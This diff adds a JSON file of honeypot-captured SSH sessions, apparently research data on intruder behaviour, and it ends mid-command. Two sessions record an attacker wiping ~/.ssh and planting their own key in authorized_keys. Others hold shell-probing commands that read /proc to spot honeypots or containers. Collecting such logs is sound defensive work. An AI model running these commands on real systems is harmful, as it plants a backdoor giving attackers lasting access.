@@ -1,0 +1,963 @@
+[
+  {
+    "session_id": "WILD-00001",
+    "actor_label": "unknown",
+    "participant_id": null,
+    "task": "wild",
+    "split": "wild",
+    "evasion_strategy": "unknown",
+    "generator_family": "wild",
+    "total_steps": 3,
+    "session_duration_s": 0.21,
+    "data_source": "cowrie_wild",
+    "src_ip": "103.86.197.214",
+    "interactions": [
+      {
+        "step": 0,
+        "command": "cd ~; chattr -ia .ssh; lockr -ia .ssh",
+        "has_typo": false,
+        "system_response": "(wild data - no captured output)",
+        "response_category": "success",
+        "inter_command_gap_s": 0.0,
+        "think_time_bin": "short",
+        "cumulative_time_s": 0.0,
+        "task_progress": 0.33
+      },
+      {
+        "step": 1,
+        "command": "lockr -ia .ssh",
+        "has_typo": false,
+        "system_response": "(wild data - no captured output)",
+        "response_category": "command_not_found",
+        "inter_command_gap_s": 0.02,
+        "think_time_bin": "short",
+        "cumulative_time_s": 0.02,
+        "task_progress": 0.67
+      },
+      {
+        "step": 2,
+        "command": "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
+        "has_typo": false,
+        "system_response": "(wild data - no captured output)",
+        "response_category": "success",
+        "inter_command_gap_s": 0.2,
+        "think_time_bin": "short",
+        "cumulative_time_s": 0.21,
+        "task_progress": 1.0
+      }
+    ]
+  },
+  {
+    "session_id": "WILD-00002",
+    "actor_label": "unknown",
+    "participant_id": null,
+    "task": "wild",
+    "split": "wild",
+    "evasion_strategy": "unknown",
+    "generator_family": "wild",
+    "total_steps": 3,
+    "session_duration_s": 0.22,
+    "data_source": "cowrie_wild",
+    "src_ip": "103.86.197.214",
+    "interactions": [
+      {
+        "step": 0,
+        "command": "cd ~; chattr -ia .ssh; lockr -ia .ssh",
+        "has_typo": false,
+        "system_response": "(wild data - no captured output)",
+        "response_category": "success",
+        "inter_command_gap_s": 0.0,
+        "think_time_bin": "short",
+        "cumulative_time_s": 0.0,
+        "task_progress": 0.33
+      },
+      {
+        "step": 1,
+        "command": "lockr -ia .ssh",
+        "has_typo": false,
+        "system_response": "(wild data - no captured output)",
+        "response_category": "command_not_found",
+        "inter_command_gap_s": 0.03,
+        "think_time_bin": "short",
+        "cumulative_time_s": 0.03,
+        "task_progress": 0.67
+      },
+      {
+        "step": 2,
+        "command": "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
+        "has_typo": false,
+        "system_response": "(wild data - no captured output)",
+        "response_category": "success",
+        "inter_command_gap_s": 0.19,
+        "think_time_bin": "short",
+        "cumulative_time_s": 0.22,
+        "task_progress": 1.0
+      }
+    ]
+  },
+  {
+    "session_id": "WILD-00003",
+    "actor_label": "unknown",
+    "participant_id": null,
+    "task": "wild",
+    "split": "wild",
+    "evasion_strategy": "unknown",
+    "generator_family": "wild",
+    "total_steps": 16,
+    "session_duration_s": 0.35,
+    "data_source": "cowrie_wild",
+    "src_ip": "195.178.110.217",
+    "interactions": [
+      {
+        "step": 0,
+        "command": "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_5af75361b679abd4c3fcde7e5aed87b4_small_control'\"'\"' '\"'\"'check_5af75361b679abd4c3fcde7e5aed87b4'\"'\"''",
+        "has_typo": false,
+        "system_response": "(wild data - no captured output)",
+        "response_category": "success",
+        "inter_command_gap_s": 0.0,
+        "think_time_bin": "short",
+        "cumulative_time_s": 0.0,
+        "task_progress": 0.06
+      },
+      {
+        "step": 1,
+        "command": "printf '\\n%s|%s\\n' 'check_5af75361b679abd4c3fcde7e5aed87b4_small_control' 'check_5af75361b679abd4c3fcde7e5aed87b4'",
+        "has_typo": false,
+        "system_response": "(wild data - no captured output)",
+        "response_category": "success",
+        "inter_command_gap_s": 0.03,
+        "think_time_bin": "short",
+        "cumulative_time_s": 0.03,
+        "task_progress": 0.12
+      },
+      {
+        "step": 2,
+        "command": "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_5af75361b679abd4c3fcde7e5aed87b4_small_math'\"'\"' \"$((357*535+8))\"'",
+        "has_typo": false,
+        "system_response": "(wild data - no captured output)",
+        "response_category": "success",
+        "inter_command_gap_s": 0.02,
+        "think_time_bin": "short",
+        "cumulative_time_s": 0.05,
+        "task_progress": 0.19
+      },
+      {
+        "step": 3,
+        "command": "printf '\\n%s|%s\\n' 'check_5af75361b679abd4c3fcde7e5aed87b4_small_math' \"$((357*535+8))\"",
+        "has_typo": false,
+        "system_response": "(wild data - no captured output)",
+        "response_category": "success",
+        "inter_command_gap_s": 0.02,
+        "think_time_bin": "short",
+        "cumulative_time_s": 0.07,
+        "task_progress": 0.25
+      },
+      {
+        "step": 4,
+        "command": "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_5af75361b679abd4c3fcde7e5aed87b4_small_pid'\"'\"' \"$$\"'",
+        "has_typo": false,
+        "system_response": "(wild data - no captured output)",
+        "response_category": "success",
+        "inter_command_gap_s": 0.02,
+        "think_time_bin": "short",
+        "cumulative_time_s": 0.09,
+        "task_progress": 0.31
+      },
+      {
+        "step": 5,
+        "command": "printf '\\n%s|%s\\n' 'check_5af75361b679abd4c3fcde7e5aed87b4_small_pid' \"$$\"",
+        "has_typo": false,
+        "system_response": "(wild data - no captured output)",
+        "response_category": "success",
+        "inter_command_gap_s": 0.02,
+        "think_time_bin": "short",
+        "cumulative_time_s": 0.11,
+        "task_progress": 0.38
+      },
+      {
+        "step": 6,
+        "command": "sh -c 'set -- '\"'\"'check_5af75361b679abd4c3fcde7e5aed87b4_arg1'\"'\"' '\"'\"'check_5af75361b679abd4c3fcde7e5aed87b4_arg2'\"'\"'; printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_5af75361b679abd4c3fcde7e5aed87b4_small_positional'\"'\"' \"$#|$1|$2\"'",
+        "has_typo": false,
+        "system_response": "(wild data - no captured output)",
+        "response_category": "success",
+        "inter_command_gap_s": 0.03,
+        "think_time_bin": "short",
+        "cumulative_time_s": 0.13,
+        "task_progress": 0.44
+      },
+      {
+        "step": 7,
+        "command": "set -- 'check_5af75361b679abd4c3fcde7e5aed87b4_arg1' 'check_5af75361b679abd4c3fcde7e5aed87b4_arg2'; printf '\\n%s|%s\\n' 'check_5af75361b679abd4c3fcde7e5aed87b4_small_positional' \"$#|$1|$2\"",
+        "has_typo": false,
+        "system_response": "(wild data - no captured output)",
+        "response_category": "success",
+        "inter_command_gap_s": 0.03,
+        "think_time_bin": "short",
+        "cumulative_time_s": 0.16,
+        "task_progress": 0.5
+      },
+      {
+        "step": 8,
+        "command": "sh -c 'f_check_5af75361b679abd4c3fcde7e5aed87b4() { printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_5af75361b679abd4c3fcde7e5aed87b4_small_function'\"'\"' \"$1|$#\"; }; f_check_5af75361b679abd4c3fcde7e5aed87b4 '\"'\"'check_5af75361b679abd4c3fcde7e5aed87b4_function_value'\"'\"''",
+        "has_typo": false,
+        "system_response": "(wild data - no captured output)",
+        "response_category": "success",
+        "inter_command_gap_s": 0.04,
+        "think_time_bin": "short",
+        "cumulative_time_s": 0.2,
+        "task_progress": 0.56
+      },
+      {
+        "step": 9,
+        "command": "f_check_5af75361b679abd4c3fcde7e5aed87b4() { printf '\\n%s|%s\\n' 'check_5af75361b679abd4c3fcde7e5aed87b4_small_function' \"$1|$#\"; }; f_check_5af75361b679abd4c3fcde7e5aed87b4 'check_5af75361b679abd4c3fcde7e5aed87b4_function_value'",
+        "has_typo": false,
+        "system_response": "(wild data - no captured output)",
+        "response_category": "success",
+        "inter_command_gap_s": 0.02,
+        "think_time_bin": "short",
+        "cumulative_time_s": 0.22,
+        "task_progress": 0.62
+      },
+      {
+        "step": 10,
+        "command": "sh -c 'printf '\"'\"'\\n%s\\n'\"'\"' '\"'\"'check_5af75361b679abd4c3fcde7e5aed87b4_small_done'\"'\"''",
+        "has_typo": false,
+        "system_response": "(wild data - no captured output)",
+        "response_category": "success",
+        "inter_command_gap_s": 0.03,
+        "think_time_bin": "short",
+        "cumulative_time_s": 0.26,
+        "task_progress": 0.69
+      },
+      {
+        "step": 11,
+        "command": "printf '\\n%s\\n' 'check_5af75361b679abd4c3fcde7e5aed87b4_small_done'",
+        "has_typo": false,
+        "system_response": "(wild data - no captured output)",
+        "response_category": "success",
+        "inter_command_gap_s": 0.02,
+        "think_time_bin": "short",
+        "cumulative_time_s": 0.27,
+        "task_progress": 0.75
+      },
+      {
+        "step": 12,
+        "command": "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_4b2e0ce2b17f827d04944acf90301877_small_control'\"'\"' '\"'\"'check_4b2e0ce2b17f827d04944acf90301877'\"'\"''",
+        "has_typo": false,
+        "system_response": "(wild data - no captured output)",
+        "response_category": "success",
+        "inter_command_gap_s": 0.02,
+        "think_time_bin": "short",
+        "cumulative_time_s": 0.29,
+        "task_progress": 0.81
+      },
+      {
+        "step": 13,
+        "command": "printf '\\n%s|%s\\n' 'check_4b2e0ce2b17f827d04944acf90301877_small_control' 'check_4b2e0ce2b17f827d04944acf90301877'",
+        "has_typo": false,
+        "system_response": "(wild data - no captured output)",
+        "response_category": "success",
+        "inter_command_gap_s": 0.02,
+        "think_time_bin": "short",
+        "cumulative_time_s": 0.31,
+        "task_progress": 0.88
+      },
+      {
+        "step": 14,
+        "command": "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_4b2e0ce2b17f827d04944acf90301877_small_math'\"'\"' \"$((304*326+41))\"'",
+        "has_typo": false,
+        "system_response": "(wild data - no captured output)",
+        "response_category": "success",
+        "inter_command_gap_s": 0.02,
+        "think_time_bin": "short",
+        "cumulative_time_s": 0.33,
+        "task_progress": 0.94
+      },
+      {
+        "step": 15,
+        "command": "printf '\\n%s|%s\\n' 'check_4b2e0ce2b17f827d04944acf90301877_small_math' \"$((304*326+41))\"",
+        "has_typo": false,
+        "system_response": "(wild data - no captured output)",
+        "response_category": "success",
+        "inter_command_gap_s": 0.02,
+        "think_time_bin": "short",
+        "cumulative_time_s": 0.35,
+        "task_progress": 1.0
+      }
+    ]
+  },
+  {
+    "session_id": "WILD-00004",
+    "actor_label": "unknown",
+    "participant_id": null,
+    "task": "wild",
+    "split": "wild",
+    "evasion_strategy": "unknown",
+    "generator_family": "wild",
+    "total_steps": 16,
+    "session_duration_s": 6.94,
+    "data_source": "cowrie_wild",
+    "src_ip": "195.178.110.217",
+    "interactions": [
+      {
+        "step": 0,
+        "command": "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_4b2e0ce2b17f827d04944acf90301877_small_pid'\"'\"' \"$$\"'",
+        "has_typo": false,
+        "system_response": "(wild data - no captured output)",
+        "response_category": "success",
+        "inter_command_gap_s": 0.0,
+        "think_time_bin": "short",
+        "cumulative_time_s": 0.0,
+        "task_progress": 0.06
+      },
+      {
+        "step": 1,
+        "command": "printf '\\n%s|%s\\n' 'check_4b2e0ce2b17f827d04944acf90301877_small_pid' \"$$\"",
+        "has_typo": false,
+        "system_response": "(wild data - no captured output)",
+        "response_category": "success",
+        "inter_command_gap_s": 0.02,
+        "think_time_bin": "short",
+        "cumulative_time_s": 0.02,
+        "task_progress": 0.12
+      },
+      {
+        "step": 2,
+        "command": "sh -c 'set -- '\"'\"'check_4b2e0ce2b17f827d04944acf90301877_arg1'\"'\"' '\"'\"'check_4b2e0ce2b17f827d04944acf90301877_arg2'\"'\"'; printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_4b2e0ce2b17f827d04944acf90301877_small_positional'\"'\"' \"$#|$1|$2\"'",
+        "has_typo": false,
+        "system_response": "(wild data - no captured output)",
+        "response_category": "success",
+        "inter_command_gap_s": 0.03,
+        "think_time_bin": "short",
+        "cumulative_time_s": 0.05,
+        "task_progress": 0.19
+      },
+      {
+        "step": 3,
+        "command": "set -- 'check_4b2e0ce2b17f827d04944acf90301877_arg1' 'check_4b2e0ce2b17f827d04944acf90301877_arg2'; printf '\\n%s|%s\\n' 'check_4b2e0ce2b17f827d04944acf90301877_small_positional' \"$#|$1|$2\"",
+        "has_typo": false,
+        "system_response": "(wild data - no captured output)",
+        "response_category": "success",
+        "inter_command_gap_s": 0.04,
+        "think_time_bin": "short",
+        "cumulative_time_s": 0.09,
+        "task_progress": 0.25
+      },
+      {
+        "step": 4,
+        "command": "sh -c 'f_check_4b2e0ce2b17f827d04944acf90301877() { printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_4b2e0ce2b17f827d04944acf90301877_small_function'\"'\"' \"$1|$#\"; }; f_check_4b2e0ce2b17f827d04944acf90301877 '\"'\"'check_4b2e0ce2b17f827d04944acf90301877_function_value'\"'\"''",
+        "has_typo": false,
+        "system_response": "(wild data - no captured output)",
+        "response_category": "success",
+        "inter_command_gap_s": 0.06,
+        "think_time_bin": "short",
+        "cumulative_time_s": 0.15,
+        "task_progress": 0.31
+      },
+      {
+        "step": 5,
+        "command": "f_check_4b2e0ce2b17f827d04944acf90301877() { printf '\\n%s|%s\\n' 'check_4b2e0ce2b17f827d04944acf90301877_small_function' \"$1|$#\"; }; f_check_4b2e0ce2b17f827d04944acf90301877 'check_4b2e0ce2b17f827d04944acf90301877_function_value'",
+        "has_typo": false,
+        "system_response": "(wild data - no captured output)",
+        "response_category": "success",
+        "inter_command_gap_s": 0.02,
+        "think_time_bin": "short",
+        "cumulative_time_s": 0.17,
+        "task_progress": 0.38
+      },
+      {
+        "step": 6,
+        "command": "sh -c 'printf '\"'\"'\\n%s\\n'\"'\"' '\"'\"'check_4b2e0ce2b17f827d04944acf90301877_small_done'\"'\"''",
+        "has_typo": false,
+        "system_response": "(wild data - no captured output)",
+        "response_category": "success",
+        "inter_command_gap_s": 0.05,
+        "think_time_bin": "short",
+        "cumulative_time_s": 0.22,
+        "task_progress": 0.44
+      },
+      {
+        "step": 7,
+        "command": "printf '\\n%s\\n' 'check_4b2e0ce2b17f827d04944acf90301877_small_done'",
+        "has_typo": false,
+        "system_response": "(wild data - no captured output)",
+        "response_category": "success",
+        "inter_command_gap_s": 0.02,
+        "think_time_bin": "short",
+        "cumulative_time_s": 0.24,
+        "task_progress": 0.5
+      },
+      {
+        "step": 8,
+        "command": "echo; echo 'check_881f444b5db6cac5d2934077f29bc862_transport_done'",
+        "has_typo": false,
+        "system_response": "(wild data - no captured output)",
+        "response_category": "success",
+        "inter_command_gap_s": 0.02,
+        "think_time_bin": "short",
+        "cumulative_time_s": 0.25,
+        "task_progress": 0.56
+      },
+      {
+        "step": 9,
+        "command": "sh -c 'printf '\"'\"'\\n%s\\n'\"'\"' '\"'\"'check_9a7d2ac469236a537b2cbfaee305f4a8_begin'\"'\"'; sh -c '\"'\"'printf '\"'\"'\"'\"'\"'\"'\"'\"'%s\\n'\"'\"'\"'\"'\"'\"'\"'\"' '\"'\"'\"'\"'\"'\"'\"'\"'check_97929363f6f800c651efb0cfe62fd4cf_control'\"'\"'\"'\"'\"'\"'\"'\"'; printf '\"'\"'\"'\"'\"'\"'\"'\"'\\n%s\\n'\"'\"'\"'\"'\"'\"'\"'\"' '\"'\"'\"'\"'\"'\"'\"'\"'check_97929363f6f800c651efb0cfe62fd4cf_0_begin'\"'\"'\"'\"'\"'\"'\"'\"'; sh -c '\"'\"'\"'\"'\"'\"'\"'\"'if IFS='\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"' '\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"' read -r _filter_pid _filter_rest < /proc/self/stat; then _filter_status_pid=NA; _filter_ns=NA; _filter_status_ok=0; if [ -r /proc/self/status ]; then _filter_status_ok=1; while IFS=: read -r _filter_key _filter_values; do case \"$_filter_key\" in Pid) _filter_status_pid=$_filter_values;; NSpid) _filter_ns=$_filter_values;; esac; done < /proc/self/status; fi; printf '\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'%s|%s|%s|%s|%s|%s|%s\\n'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"' '\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'check_6b577bfd5f25c2b1b7658c5ac8f5b92b'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"' \"$$\" \"$_filter_pid\" \"$((6*7))\" \"$_filter_status_pid\" \"$_filter_ns\" \"$_filter_status_ok\"; else printf '\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'%s\\n'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"' '\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'check_6b577bfd5f25c2b1b7658c5ac8f5b92b:NA'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'; fi'\"'\"'\"'\"'\"'\"'\"'\"' 2>&1; _filter_status=$?; printf '\"'\"'\"'\"'\"'\"'\"'\"'\\n%s:%s\\n'\"'\"'\"'\"'\"'\"'\"'\"' '\"'\"'\"'\"'\"'\"'\"'\"'check_97929363f6f800c651efb0cfe62fd4cf_0_end'\"'\"'\"'\"'\"'\"'\"'\"' \"$_filter_status\"; printf '\"'\"'\"'\"'\"'\"'\"'\"'\\n%s\\n'\"'\"'\"'\"'\"'\"'\"'\"' '\"'\"'\"'\"'\"'\"'\"'\"'check_97929363f6f800c651efb0cfe62fd4cf_1_begin'\"'\"'\"'\"'\"'\"'\"'\"'; sh -c '\"'\"'\"'\"'\"'\"'\"'\"'if IFS='\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"' '\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"' read -r _filter_pid _filter_rest < /proc/self/stat; then _filter_status_pid=NA; _filter_ns=NA; _filter_status_ok=0; if [ -r /proc/self/status ]; then _filter_status_ok=1; while IFS=: read -r _filter_key _filter_values; do case \"$_filter_key\" in Pid) _filter_status_pid=$_filter_values;; NSpid) _filter_ns=$_filter_values;; esac; done < /proc/self/status; fi; printf '\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'%s|%s|%s|%s|%s|%s|%s\\n'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"' '\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'check_ff1270dd332e49f83ae0f286d7186c6e'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"' \"$$\" \"$_filter_pid\" \"$((6*7))\" \"$_filter_status_pid\" \"$_filter_ns\" \"$_filter_status_ok\"; else printf '\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'%s\\n'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"' '\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'check_ff1270dd332e49f83ae0f286d7186c6e:NA'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'; fi'\"'\"'\"'\"'\"'\"'\"'\"' 2>&1; _filter_status=$?; printf '\"'\"'\"'\"'\"'\"'\"'\"'\\n%s:%s\\n'\"'\"'\"'\"'\"'\"'\"'\"' '\"'\"'\"'\"'\"'\"'\"'\"'check_97929363f6f800c651efb0cfe62fd4cf_1_end'\"'\"'\"'\"'\"'\"'\"'\"' \"$_filter_status\"; printf '\"'\"'\"'\"'\"'\"'\"'\"'\\n%s\\n'\"'\"'\"'\"'\"'\"'\"'\"' '\"'\"'\"'\"'\"'\"'\"'\"'check_97929363f6f800c651efb0cfe62fd4cf_2_begin'\"'\"'\"'\"'\"'\"'\"'\"'; sh -c '\"'\"'\"'\"'\"'\"'\"'\"'value=$((19+23)); if [ \"$value\" -eq 42 ]; then printf '\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'%s\\n'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"' '\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'check_6b577bfd5f25c2b1b7658c5ac8f5b92b'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"' \"$value\" '\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'branch-ok'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'; else exit 9; fi'\"'\"'\"'\"'\"'\"'\"'\"' 2>&1; _filter_status=$?; printf '\"'\"'\"'\"'\"'\"'\"'\"'\\n%s:%s\\n'\"'\"'\"'\"'\"'\"'\"'\"' '\"'\"'\"'\"'\"'\"'\"'\"'check_97929363f6f800c651efb0cfe62fd4cf_2_end'\"'\"'\"'\"'\"'\"'\"'\"' \"$_filter_status\"; printf '\"'\"'\"'\"'\"'\"'\"'\"'\\n%s\\n'\"'\"'\"'\"'\"'\"'\"'\"' '\"'\"'\"'\"'\"'\"'\"'\"'check_97929363f6f800c651efb0cfe62fd4cf_3_begin'\"'\"'\"'\"'\"'\"'\"'\"'; sh -c '\"'\"'\"'\"'\"'\"'\"'\"'printf '\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'%s\\n'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"' '\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'check_6b577bfd5f25c2b1b7658c5ac8f5b92b'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"' | while IFS= read -r line; do printf '\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'pipe=%s\\n'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"' \"$line\"; done'\"'\"'\"'\"'\"'\"'\"'\"' 2>&1; _filter_status=$?; printf '\"'\"'\"'\"'\"'\"'\"'\"'\\n%s:%s\\n'\"'\"'\"'\"'\"'\"'\"'\"' '\"'\"'\"'\"'\"'\"'\"'\"'check_97929363f6f800c651efb0cfe62fd4cf_3_end'\"'\"'\"'\"'\"'\"'\"'\"' \"$_filter_status\"; printf '\"'\"'\"'\"'\"'\"'\"'\"'\\n%s\\n'\"'\"'\"'\"'\"'\"'\"'\"' '\"'\"'\"'\"'\"'\"'\"'\"'check_97929363f6f800c651efb0cfe62fd4cf_4_begin'\"'\"'\"'\"'\"'\"'\"'\"'; sh -c '\"'\"'\"'\"'\"'\"'\"'\"'v=outer; (v=inner; printf '\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'child=%s\\n'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"' \"$v\"); printf '\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'parent=%s\\n'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"' \"$v\"'\"'\"'\"'\"'\"'\"'\"'\"' 2>&1; _filter_status=$?; printf '\"'\"'\"'\"'\"'\"'\"'\"'\\n%s:%s\\n'\"'\"'\"'\"'\"'\"'\"'\"' '\"'\"'\"'\"'\"'\"'\"'\"'check_97929363f6f800c651efb0cfe62fd4cf_4_end'\"'\"'\"'\"'\"'\"'\"'\"' \"$_filter_status\"; printf '\"'\"'\"'\"'\"'\"'\"'\"'\\n%s\\n'\"'\"'\"'\"'\"'\"'\"'\"' '\"'\"'\"'\"'\"'\"'\"'\"'check_97929363f6f800c651efb0cfe62fd4cf_5_begin'\"'\"'\"'\"'\"'\"'\"'\"'; sh -c '\"'\"'\"'\"'\"'\"'\"'\"'printf '\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'%s\\n'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"' '\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'a b;$()'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"''\"'\"'\"'\"'\"'\"'\"'\"' 2>&1; _filter_status=$?; printf '\"'\"'\"'\"'\"'\"'\"'\"'\\n%s:%s\\n'\"'\"'\"'\"'\"'\"'\"'\"' '\"'\"'\"'\"'\"'\"'\"'\"'check_97929363f6f800c651efb0cfe62fd4cf_5_end'\"'\"'\"'\"'\"'\"'\"'\"' \"$_filter_status\"; printf '\"'\"'\"'\"'\"'\"'\"'\"'\\n%s\\n'\"'\"'\"'\"'\"'\"'\"'\"' '\"'\"'\"'\"'\"'\"'\"'\"'check_97929363f6f800c651efb0cfe62fd4cf_6_begin'\"'\"'\"'\"'\"'\"'\"'\"'; sh -c '\"'\"'\"'\"'\"'\"'\"'\"'set -- '\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'check_6b577bfd5f25c2b1b7658c5ac8f5b92b'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"' '\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'\"'second 